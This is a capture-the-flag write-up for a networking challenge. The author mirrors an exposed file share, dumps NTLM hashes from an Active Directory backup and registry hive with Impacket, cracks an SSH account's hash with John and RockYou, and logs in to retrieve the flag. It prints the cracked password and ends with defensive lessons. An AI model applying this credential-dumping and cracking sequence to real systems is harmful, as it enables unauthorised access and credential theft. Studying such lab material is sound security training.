# overSSHaring — Networking Challenge Write-Up

> **Category:** Networking   |   **Points:** 200 (Medium)

---

## 0  Scenario Overview

The North Torbians accidentally exposed an Active Directory backup and SYSTEM hive via a public file share at `https://msoidentity.com/files/`. My goal was to leverage these artifacts to extract SSH credentials and retrieve the flag.

## 1  Recon & Preliminary Analysis

I mirrored the share and listed its contents:

```bash
wget -r -np -nH --cut-dirs=1 -R "index.html*" https://msoidentity.com/files/
tree -L 1
```

```
.
├── 46381.py
├── 46467.txt
├── 51632.py
├── 51697.txt
├── backup                # 16 MiB – ESE database (AD backup)
├── config.json
├── configuration_deepseek.py
├── log.txt
├── opsec.txt
└── sys                   # 15 MiB – SYSTEM registry hive
```

- **log.txt** / **opsec.txt** mentioned reused passwords `s0ju` and `winter2024`.
- **config.json** was just a model config—no credentials.
- The critical files were **backup** (ESE) and **sys** (registry hive).

### 1.1  Failed Preliminary Attempts

Before dumping hashes, I tried a few direct approaches:

- **Tried SSH with known passwords** (`s0ju`, `winter2024`, and `winter2024!`) manually against common usernames → **Permission denied**.
- **Inspected **`` and Python scripts for hardcoded creds → none found.
- **Built a tiny custom John wordlist** with `s0ju`, `s0ju!`, `winter2024`, `winter2024!` → no hashes cracked.

These failures confirmed I needed to extract the underlying NTLM hashes.

---

## 2  Extracting NTLM Hashes

1. Identify file types:

   ```bash
   file backup   # ESE database
   file sys      # Windows registry hive
   ```

2. Dump NTLM hashes offline with Impacket:

   ```bash
   impacket-secretsdump -ntds backup -system sys LOCAL > ntds.txt
   grep ssh_admin ntds.txt
   ```

```
torbintime.local\ssh_admin:1114:...:8dbd9a82a5d6f6bc4124d05d247883a0:::
```

---

## 3  Cracking the Password

I started with a tiny wordlist:

```bash
printf "%s\n" s0ju s0ju! winter2024 winter2024! > custom.txt
john --format=NT --wordlist=custom.txt ssh_admin.hash
```

No hashes cracked. Next, I installed RockYou:

```bash
sudo apt install wordlists
gzip -d /usr/share/wordlists/rockyou.txt.gz
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ssh_admin.hash
john --show ssh_admin.hash
```

John revealed:

```
ssh_admin:jucheteamo
```

---

## 4  SSH & Flag Retrieval

```bash
ssh ssh_admin@msoidentity.com
# Password: jucheteamo
cat ~/flag.txt
```

```
C1{f0ll0wing_th3_l34d5}
```

---

## 5  Lessons Learned

- **Public shares can leak whole AD backups.** ESE + SYSTEM → full credential dump.
- **Chat logs as cribs** accelerate cracking strategies.
- **Minimal tooling** (Impacket + John) remains effective.
- Disable `PasswordAuthentication yes` or rotate to key-only SSH.

*Write-up by Moneer Shoukri – June 2025*

